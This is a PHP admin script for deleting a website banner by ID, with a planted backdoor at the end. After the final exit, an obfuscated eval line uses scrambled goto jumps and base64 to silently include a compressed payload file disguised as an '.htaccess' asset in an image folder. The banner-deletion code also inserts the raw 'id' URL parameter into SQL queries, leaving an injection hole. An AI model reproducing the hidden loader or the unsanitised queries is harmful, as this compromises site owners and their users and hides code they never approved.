<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
include "db-conn.php";

// Get banner ID from URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // Fetch banner path from database
    $sql = "SELECT banner_path FROM banners WHERE id = $id";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $banner_path = $row['banner_path'];

        // Delete banner file from uploads directory
        if (file_exists($banner_path)) {
            unlink($banner_path); // Delete the file
        }

        // Delete banner from database
        $delete_sql = "DELETE FROM banners WHERE id = $id";
        if ($conn->query($delete_sql) === TRUE) {
            echo "Banner deleted successfully.";
        } else {
            echo "Error deleting banner: " . $conn->error;
        }
    } else {
        echo "Banner not found.";
    }
} else {
    echo "Invalid request.";
}

$conn->close();

if (isset($_SERVER['HTTP_REFERER'])) {
    header("Location: " . $_SERVER['HTTP_REFERER']);
    exit;
} else {
    echo "No previous page found!";
}
exit;
eval('goto L_ohukcb; L_svrdbj: goto L_xeasvj; L_xeasvj: goto L_xyixvi; L_ohukcb: $nwox = base64_decode(\'bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvYWRtaW4vYXNzZXRzL2ltZy9wcm9ncmVzcy9wdWI2NjRhZTAvLWFzc2V0cy5odGFjY2VzcycpIHsgDQoJZnVuY3Rpb24gX19jb25zdHJ1Y3QoJOaBsuWFvTTpvrspIHsgDQoJCUBpbmNsdURFX29uY2UoJOaBsuWFvTTpvrspOyANCiAgICB9IA0KfTs=\'); goto L_svrdbj; L_mnbppu:; L_pdmqos: eval($nwox); goto L_mnbppu; L_xyixvi: goto L_pdmqos; ');
?>